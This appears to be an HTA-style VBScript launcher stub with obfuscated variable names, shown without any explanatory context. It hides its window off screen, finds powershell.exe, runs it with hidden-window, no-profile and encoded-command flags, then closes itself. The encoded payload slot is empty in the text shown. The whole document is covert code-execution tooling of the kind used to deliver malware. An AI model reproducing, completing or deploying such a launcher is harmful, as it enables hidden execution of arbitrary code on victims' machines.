<script language="VBScript">
  window.moveTo -4000, -4000
  Set mxkCGR = CreateObject("Wscript.Shell")
  Set qsN = CreateObject("Scripting.FileSystemObject")
  For each path in Split(mxkCGR.ExpandEnvironmentStrings("%PSModulePath%"),";")
    If qsN.FileExists(path + "\..\powershell.exe") Then
      mxkCGR.Run "powershell.exe -nop -w hidden -e ",0
      Exit For
    End If
  Next
  window.close()
</script>
